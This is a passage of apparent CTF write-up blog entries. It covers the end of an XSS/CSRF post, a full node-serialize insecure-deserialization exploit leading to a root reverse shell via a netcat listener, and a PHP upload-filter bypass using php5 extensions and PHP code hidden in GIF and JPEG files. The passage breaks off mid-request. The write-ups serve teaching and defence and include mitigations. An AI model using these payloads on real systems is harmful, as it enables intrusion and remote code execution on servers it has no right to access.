JavaScript, you can use the Content-Type and X-Content-Type-Options headers to ensure that browsers interpret the responses in the way you intend.</li><li><strong>Content Security Policy.</strong> As a last line of defense, you can use Content Security Policy (CSP) to reduce the severity of any XSS vulnerabilities that still occur.</li><li>See -&gt; <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">Cross Site Scripting Prevention Cheat Sheet</a> for more.</li></ul><h2 id="Real-Life-Examples"><a href="#Real-Life-Examples" class="headerlink" title="Real Life Examples"></a>Real Life Examples</h2><ul><li><a href="https://hackerone.com/reports/485748">Stored XSS on Twitter.com reports | HackerOne</a></li><li><a href="https://hackerone.com/reports/438240">Reflected Cross site Scripting</a><a href="https://hackerone.com/reports/438240"> </a><a href="https://hackerone.com/reports/438240">(XSS)</a><a href="https://hackerone.com/reports/438240"> on Starbucks.com | HackerOne</a></li><li><a href="https://hackerone.com/reports/419891">Cross-Site Request Forgery</a><a href="https://hackerone.com/reports/419891"> </a><a href="https://hackerone.com/reports/419891">(CSRF)</a><a href="https://hackerone.com/reports/419891"> vulnerability on API endpoint allows account takeovers | HackerOne</a></li><li><a href="https://hackerone.com/reports/127703">Full account takeover using CSRF | HackerOne</a></li></ul><hr><p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p><p>See you next time ;)</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> beginner </tag>
            
            <tag> xss </tag>
            
            <tag> csrf </tag>
            
            <tag> web socket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Misc CTF - Insecure Deserialization</title>
      <link href="/posts/misc-ctf/insecure-deserialization/"/>
      <url>/posts/misc-ctf/insecure-deserialization/</url>
      
        <content type="html"><![CDATA[<p>This challenge highlight an important and too common vulnerability: Insecure Deserialization.</p><p>Let’s solve this challenge to better understand the underlying issue there.</p><p><strong>Tl;Dr:</strong> Untrusted data passed into <code>unserialize()</code> function in <code>node-serialize</code> module is exploited to achieve arbitrary code execution and flag read by sending a serialized JavaScript Object with an Immediately invoked function expression (IIFE).</p><hr><h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>Opening the challenge display the following website:</p><p><img src="https://user-images.githubusercontent.com/9076747/80490074-1bd50600-8961-11ea-82f7-21bc6bdeebff.png" alt="paint.web"></p><p>From here it’s possible to make drawings. There is a save function for loading them later:</p><p><img src="https://user-images.githubusercontent.com/9076747/80490281-6c4c6380-8961-11ea-9806-82417db6946f.png" alt="paint.web example"></p><p>While inspecting the “save” string we notice a recurring part:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;s&quot;</span>:<span class="string">&quot;_$$ND_CC$$_$&quot;</span></span><br></pre></td></tr></table></figure><p>Searching for this string online might gives us more informations about the function used.</p><p>A quick Google search redirect us to a <a href="https://github.com/luin/serialize/pull/2/commits/70e89029d14b88f82f101af6dda6a5f17567a0e5">commit</a> from the <code>[node-serialize](https://github.com/luin/serialize)</code> library.<br>As its name indicate, it is used to serialize an object including its functions into JSON. That make sense for the “save” of our <code>paint.web</code> app drawings.</p><p>While going through the <code>Readme.md</code> of the project we notice the following warning:</p><blockquote><p>SECURITY WARNING</p><p>This module provides a way to unserialize strings into executable JavaScript code, so that it may lead security vulnerabilities if the original strings can be modified by untrusted third-parties (aka hackers). For instance, the following attack example shows how to achieve arbitrary code injection.</p></blockquote><p>This security warning sounds exactly like our paint.web app scenario. And we even have an already made example!</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> serialize = <span class="built_in">require</span>(<span class="string">&#x27;node-serialize&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> x = <span class="string">&#x27;&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function ()&#123;console.log(\&#x27;rce\&#x27;)&#125;()&quot;&#125;&#x27;</span></span><br><span class="line">serialize.unserialize(x);</span><br></pre></td></tr></table></figure><p>We can guess that the app is taking the JSON formatted data passed into the “save” form and unserialize it to get the drawing informations to display on screen.</p><p>Let’s try to inject a Javascript object into the “save” string.<br>If everything goes as planned, our JS code should be executed during the unserialize process:</p><p><img src="https://user-images.githubusercontent.com/9076747/80495735-981f1780-8968-11ea-9418-df97ff7d86d9.png"></p><p>Did it work ?</p><p><img src="https://user-images.githubusercontent.com/9076747/79325948-59be3d00-7f12-11ea-93d9-97fe5ed8d740.jpg"></p><p>Since the application doesn’t output anything, how can we know that our injection was successful ? Once again we will have to go with a blind injection.</p><h2 id="Blind-JS-Object-injection"><a href="#Blind-JS-Object-injection" class="headerlink" title="Blind JS Object injection"></a>Blind JS Object injection</h2><p>The first way that comes to mind when doing blind injection is to use the <code>sleep</code> function. We inject a <code>sleep 5</code> and if the request takes 5 seconds to finish then we can conclude the injection was successful. </p><p>Since we are in front of a Node application, this might not be the best way to go. Node being asynchronous it’s very possible a new thread will spawn the <code>sleep 5</code> and immediately close the request without waiting for the sleep to finish.</p><p>A better way to check if our injection worked in our scenario is to make a GET request to a server we control. This way we can check the access and see if the GET requests was sent from the applications backend.</p><p>Here is an example on how to do it:</p><ol><li>First let’s open a simple web server using python on our machine :</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure><ol start="2"><li>Craft our JS code to make a call to this server and include it in the payload:</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;rce&quot;</span>:<span class="string">&quot;_$$ND_FUNC$$_function ()&#123; require(&#x27;http&#x27;).get(&#x27;http://192.168.1.21:8000/paintwebrce&#x27;) &#125;()&quot;</span>&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>Use the app load function to send the payload:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">&#x27;http://ctf.one:3646/load&#x27;</span> \</span><br><span class="line"> -H <span class="string">&#x27;Content-Type: text/plain&#x27;</span> \</span><br><span class="line"> -d $<span class="string">&#x27;&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function ()&#123; require(\&#x27;</span>http\<span class="string">&#x27;).get(\&#x27;</span>http://192.168.1.21:8000/paintwebrce\<span class="string">&#x27;) &#125;()&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure><ol start="4"><li>Validate our server received the request:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">192.168.1.21 - - [11:34:31] <span class="string">&quot;GET /paintwebrce HTTP/1.1&quot;</span> 404 -</span><br></pre></td></tr></table></figure><p>We now have confirmed we can execute JS code on the app backend.</p><h2 id="Opening-a-reverse-shell"><a href="#Opening-a-reverse-shell" class="headerlink" title="Opening a reverse-shell"></a>Opening a reverse-shell</h2><p>We now have a way to execute JS on the app backend, what’s the next step ?</p><p>Let’s open a reverse shell to gain full access over the app server. As a reminder:</p><blockquote><p>A reverse shell is a shell session established on a connection that is initiated from a remote machine, not from the local host. Attackers who successfully exploit a remote command execution vulnerability can use a reverse shell to obtain an interactive shell session on the target machine and continue their attack. A reverse shell (also called a connect-back shell) can also be the only way to gain remote shell access across a NAT or firewall.</p><p>Source: <a href="https://www.netsparker.com/blog/web-security/understanding-reverse-shells/">Understanding Reverse Shells</a></p></blockquote><p>So far we do not have a lot of knowledge about the server, we do not know if <code>python</code>, <code>wget</code>, <code>curl</code>, <code>netcat</code> or this kind of useful tools are installed.</p><p>One thing we know for sure is that the server is running Node (<code>X-Powered-By: Express</code>). To make sure our reverse shell can work let’s create a Node based reverse shell.</p><p>First let’s open an <code>netcat</code> listener that will receive the connection from the reverse shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ netcat -l -p 8585 -vv  <span class="comment"># Mac: brew install netcat</span></span><br><span class="line">Listening on any address 8585</span><br></pre></td></tr></table></figure><p>And now let’s use <a href="https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py">nodejsshell.py</a> script to generate a Nodejs reverse shell:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ python2 nodejsshell.py 192.168.1.21 8585</span><br><span class="line">[+] LHOST = 192.168.1.21</span><br><span class="line">[+] LPORT = 8585</span><br><span class="line">[+] Encoding</span><br><span class="line"><span class="built_in">eval</span>(String.fromCharCode(10,118,[...],59,10))</span><br></pre></td></tr></table></figure><p>Let’s include this encoded reserve shell to our payload and load it:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;rce&quot;</span>:<span class="string">&quot;_$$ND_FUNC$$_function ()&#123; eval(String.fromCharCode(10,118,[...],59,10))&#125;()&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/9076747/80499934-da972300-896d-11ea-812a-bb2fa5652e9a.png"></p><p>As soon as we click on “<strong>Load</strong>“ on new connection appear on our listener, giving us full access to the remote server:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ netcat -l -p 8585 -vv</span><br><span class="line">Listening on any address 8585</span><br><span class="line">Connection from 192.168.1.21:55197</span><br><span class="line">Connected!</span><br><span class="line">$ id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</span><br><span class="line">$ ls</span><br><span class="line">index.html</span><br><span class="line">index.js</span><br><span class="line">node_modules</span><br><span class="line">package-lock.json</span><br><span class="line">package.json</span><br><span class="line">$ grep -ri <span class="string">&#x27;FLAG&#123;&#x27;</span> .</span><br><span class="line">./index.js:// FLAG&#123;b3w4r3 0f 53r14l1z4710n!&#125;</span><br></pre></td></tr></table></figure><h2 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h2><p>The only safe architectural pattern is not to accept serialized objects from untrusted sources or to use serialization mediums that only permit primitive data types. If that is not possible, consider one of more of the following:</p><ul><li>Implementing integrity checks such as digital signatures on any serialized objects to prevent hostile object creation or data tampering.</li><li>Enforcing strict type constraints during deserialization before object creation as the code typically expects a definable set of classes. Bypasses to this technique have been demonstrated, so reliance solely on this is not advisable.</li><li>Isolating and running code that deserializes in low privilege environments when possible.</li><li>Log deserialization exceptions and failures, such as where the incoming type is not the expected type, or the deserialization throws exceptions.</li><li>Restricting or monitoring incoming and outgoing network connectivity from containers or servers that deserialize.</li><li>Monitoring deserialization, alerting if a user deserializes constantly.</li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/">Exploiting Node.js deserialization bug for Remote Code Execution</a></li><li><a href="https://hdivsecurity.com/bornsecure/insecure-deserialization-attack-examples-mitigation/">Insecure Deserialization: attack examples and mitigation</a></li><li><a href="https://greyshell.github.io/blog/2019/11/22/java-insecure-deserialization/">Insecure Deserialization in Java</a></li><li><a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A8-Insecure_Deserialization">A8 - Insecure Deserialization | OWASP</a></li><li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html">Guidance on Deserializing Objects Safely</a></li><li><a href="https://cwe.mitre.org/data/definitions/502.html">CWE-502: Deserialization of Untrusted Data</a></li></ul><h2 id="Real-Life-example"><a href="#Real-Life-example" class="headerlink" title="Real Life example"></a>Real Life example</h2><ul><li><a href="https://hackerone.com/reports/142562">Remote Code Execution Unserialize to XXE, file disclosure on ams.upload.pornhub.com - $10,000 bounty | HackerOne</a></li><li><a href="https://hackerone.com/reports/562335">Remote Code Execution through Deserialization Attack in OwnBackup app | HackerOne</a></li><li><a href="https://hackerone.com/reports/329399">Remote Code Execution (RCE) in a U.S. Dept Of Defense website | HackerOne</a></li><li><a href="https://hackerone.com/reports/410882">Vanilla Forums domGetImages getimagesize Unserialize Remote Code Execution Vulnerability | HackerOne</a></li></ul><hr><p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p><p>See you next time ;)</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> beginner </tag>
            
            <tag> insecure deserialization </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Misc CTF - Upload Restrictions Bypass</title>
      <link href="/posts/misc-ctf/upload-restriction-bypass/"/>
      <url>/posts/misc-ctf/upload-restriction-bypass/</url>
      
        <content type="html"><![CDATA[<p>This challenge highlight the potential risks of bad upload handling and how it can lead to remote code execution on server. In this writeup will go back to the basics and discuss the most common ways to bypass upload restrictions to achieve RCE.</p><p><strong>Tl;Dr:</strong> The upload server don’t check correctly the file type of uploaded images. It’s possible to bypass the filter by uploading <code>php5</code>, GIF, or JPEG file containing PHP commands that get executed by the server. </p><p>Alright! Let’s get into the details now!</p><hr><h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>Opening the challenge display the following website:</p><p><img src="https://user-images.githubusercontent.com/9076747/123555482-3afa3e00-d786-11eb-9491-f06f6c82d28f.png" alt="look at me misc ctf"></p><p>Once we upload an image we can see it being stored on the server:</p><img width="1253" alt="image upload misc ctf" src="https://user-images.githubusercontent.com/9076747/123555521-93c9d680-d786-11eb-8756-fb2923936bca.png"><p>While looking at the request information we notice the app is running PHP 5. This might come useful later:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://misc.ctf:33432/ -I</span><br><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.14.2</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Wed, 17 Jun 2020 08:24:44 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/5.6.40</span><br></pre></td></tr></table></figure><h2 id="Sending-PHP-files"><a href="#Sending-PHP-files" class="headerlink" title="Sending PHP files"></a>Sending PHP files</h2><p>So far we know that the file we send is being stored on the server and the server is running PHP. With those informations we can imagine one way to abuse this upload form: If we could manage to send PHP files we could potentially execute our own PHP script on the server and get full control of it.</p><p>Let’s see how we can do that.</p><p>First to have a file executed as PHP we need this file to have a valid PHP extension to be recognised as such by the server. </p><p>Let’s edit the request made when uploading a file by changing <code>filename</code> parameter to see if we can change our image file to have a <code>.php</code> extension:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>misc.ctf:33432</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=X</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>158</span><br><span class="line">--X</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;image&quot;; filename=&quot;1591801133556.php&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/jpeg</span><br><span class="line">ÿØÿà�JFIF����ÿþ�Compressed by jpeg-recompressÿÛ&quot;&quot;*%%*424DD\&quot;*%%*424DD\ÿÂÿÄ</span><br><span class="line">/Òóêaó|ª3¥&#125;ZóQO 7-ñCÒßUÝÝ&#123;cót;£òÌzRãÿÄÿÚÿÄÿÚÿÄ1&quot;$Qr%023ASTcÿÚý«Ê|~   YßZE6ÙHè²Òà(¤\&quot;r«¬£u°übnG³Ø=&#125;MzMb&#123;³äÐ\rM¤z&#123;h¼EÁd¢øëè~ËªkÊlZPÚE°fãc&quot;#¢óDM&quot;</span><br><span class="line">--X--</span><br></pre></td></tr></table></figure><p>And bummer the server return to us a <code>400 Bad Request</code>.</p><p>After a few different tries it’s easy to notice that the server is using a blacklist and not a whitelist of “valid” file extension since it’s possible to upload <code>.xyz</code>, <code>.phhp</code>, <code>.html</code> and so on.</p><p>So now we know that the server is blacklisting <code>.php</code> extension. And as with every blacklist we know that something will probably be forgotten…</p><h2 id="Bypassing-file-extension-restriction"><a href="#Bypassing-file-extension-restriction" class="headerlink" title="Bypassing file extension restriction"></a>Bypassing file extension restriction</h2><p>Firstly it’s good to know that not only .php file gets interpreted as PHP by servers, there is some other less used extensions that gets interpreted as-well:</p><ul><li>.phtml</li><li>.php3</li><li>.php4</li><li>.php5</li><li>.inc</li></ul><p>Maybe one of those extension is not blacklisted by the server ?</p><p>Since we know the server is running PHP5 let’s give a try to <code>.php5</code> extension:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>misc.ctf:33432</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=X</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>158</span><br><span class="line">--X</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;image&quot;; filename=&quot;1591801133556.php5&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/jpeg</span><br><span class="line">ÿØÿà�JFIF����ÿþ�Compressed by jpeg-recompressÿÛ&quot;&quot;*%%*424DD\&quot;*%%*424DD\ÿÂÿÄ</span><br><span class="line">/Òóêaó|ª3¥&#125;ZóQO 7-ñCÒßUÝÝ&#123;cót;£òÌzRãÿÄÿÚÿÄÿÚÿÄ1&quot;$Qr%023ASTcÿÚý«Ê|~   YßZE6ÙHè²Òà(¤\&quot;r«¬£u°übnG³Ø=&#125;MzMb&#123;³äÐ\rM¤z&#123;h¼EÁd¢øëè~ËªkÊlZPÚE°fãc&quot;#¢óDM&quot;</span><br><span class="line">--X--</span><br></pre></td></tr></table></figure><p>Bingo! The file got uploaded and is now accessible on the server:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://misc.ctf:33432/1592382731183.php5 -I</span><br><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>nginx/1.14.2</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Wed, 17 Jun 2020 08:54:55 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/5.6.40</span><br></pre></td></tr></table></figure><p><em>Note: It was also possible to use capital PHP extension to bypass the filter (<code>.PHP</code>, <code>.pHp</code>, etc…)</em></p><p>Alright we have a file that can get executed as PHP, now we need to put actual PHP content in it.</p><p>Let’s give a try like before:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>misc.ctf:33432</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=X</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>158</span><br><span class="line">--X</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;image&quot;; filename=&quot;1591801133556.php5&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/jpeg</span><br><span class="line">&lt;?php phpinfo();</span><br><span class="line">--X--</span><br></pre></td></tr></table></figure><p>And again we get hit by a <code>400 Bad Request</code>. Seems like there is another check on the file content itself now…</p><h2 id="Bypassing-File-Content-Check"><a href="#Bypassing-File-Content-Check" class="headerlink" title="Bypassing File Content Check"></a>Bypassing File Content Check</h2><p>If we check the PHP documentation on how to check a file for its type we stumble upon <code>mime_content_type()</code>:</p><blockquote><p>mime_content_type<br>Detect MIME Content-type for a file<br><a href="https://www.php.net/manual/en/function.mime-content-type.php">https://www.php.net/manual/en/function.mime-content-type.php</a></p></blockquote><p>Well so far we know for sure that GIF and JPEG files are allowed. Can we possibly snuggle PHP into one of those two files?</p><p><strong>Including PHP in a GIF file</strong></p><p>Reading through the <a href="https://www.w3.org/Graphics/GIF/spec-gif89a.txt">GIF Specification</a> we found that the Comment Extension allows to put a comment in the GIF at the end of the file. We should probably be able to put PHP code there:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    7 6 5 4 3 2 1 0        Field Name                    Type</span><br><span class="line">   +---------------+</span><br><span class="line">0  |      0x21     |       Extension Introducer          Byte</span><br><span class="line">   +---------------+</span><br><span class="line">1  |      0xFE     |       Comment Label                 Byte</span><br><span class="line">   +---------------+</span><br><span class="line"></span><br><span class="line">   +===============+</span><br><span class="line">   |    &lt;?         |</span><br><span class="line">N  |    phpinfo(); |       Comment Data            Data Sub-blocks</span><br><span class="line">   |               |</span><br><span class="line">   +===============+</span><br><span class="line"></span><br><span class="line">   +---------------+</span><br><span class="line">0  |       ;       |       Block Terminator              Byte</span><br><span class="line">   +---------------+</span><br></pre></td></tr></table></figure><p>Since PHP <code>mime_content_type()</code> function validate a file as being a “GIF” simply if the GIF header is present, we should be able to append PHP code to the GIF Header and bypass the upload restriction. Let’s give it a try.</p><p>The simplest way is to append our PHP code to the <code>GIF89a</code> header: <code>GIF89a;&lt;?=phpinfo();</code>.</p><p>Let’s send that:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>misc.ctf:33432</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=X</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>158</span><br><span class="line">--X</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;image&quot;; filename=&quot;1592382731186.php5&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/gif</span><br><span class="line">GIF89a;&lt;?=phpinfo();</span><br><span class="line">--X--</span><br></pre></td></tr></table></figure><p>This time the file gets uploaded successfully. We can find our phpinfo being executed when opening the file:</p><img width="1347" alt="phpinfo gif misc ctf" src="https://user-images.githubusercontent.com/9076747/123555728-d04a0200-d787-11eb-8398-f63c4ca46462.png"><p><strong>Including PHP in a JPEG file</strong></p><p>Following the same idea it’s also possible to append PHP into a JPEG image.</p><p>The JPEG header being slightly less complicated than the <code>GIF89a</code> of GIF we can append our PHP code to an existing JPEG image to keep it simple:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;&lt;?=phpinfo();&quot;</span> &gt;&gt; myimage.jpg</span><br></pre></td></tr></table></figure><p>And upload it as before:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>misc.ctf:33432</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=X</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>158</span><br><span class="line">--X</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;image&quot;; filename=&quot;1592382731190.php5&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/jpeg</span><br><span class="line">ÿØÿà�JFIF����ÿþ�Compressed by jpeg-recompressÿÛ&quot;&quot;*%%*424DD\&quot;*%%*424DD\ÿÂÿÄ</span><br><span class="line">/Òóêaó|ª3¥&#125;ZóQO 7-ñCÒßUÝÝ&#123;cót;£òÌzRãÿÄÿÚÿÄÿÚÿÄ1&quot;$Qr%023ASTcÿÚý«Ê|~   YßZE6ÙHè²Òà(¤\&quot;r«¬£u°übnG³Ø=&#125;MzMb&#123;³äÐ\rM¤z&#123;h¼EÁd¢øëè~ËªkÊlZPÚE°fãc&quot;#¢óDM&quot;&lt;?=phpinfo();</span><br><span class="line">--X--</span><br></pre></td></tr></table></figure><p>The file gets uploaded successfully. And even though the output contains a bit more rubbish (the actual JPEG bytes), our PHP code get successfully executed:</p><img width="1346" alt="phpinfo jpeg misc ctf" src="https://user-images.githubusercontent.com/9076747/123555766-169f6100-d788-11eb-8f89-81434c208186.png"><h2 id="Using-PHP-for-Remote-Code-Execution"><a href="#Using-PHP-for-Remote-Code-Execution" class="headerlink" title="Using PHP for Remote Code Execution"></a>Using PHP for Remote Code Execution</h2><p>Having a way to execute PHP on the serveur make it easy to escalate to Remote Code Execution on the server. </p><p>We can use for example the <code>system()</code> function of PHP:</p><blockquote><p><strong>system</strong><br>system — Execute an external program and display the output<br><a href="https://www.php.net/manual/en/function.system.php">https://www.php.net/manual/en/function.system.php</a></p></blockquote><p>Let’s create a new malicious file and upload it:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>misc.ctf:33432</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=X</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>158</span><br><span class="line">--X</span><br><span class="line"><span class="attribute">Content-Disposition</span><span class="punctuation">: </span>form-data; name=&quot;image&quot;; filename=&quot;1592382731199.php5&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>image/gif</span><br><span 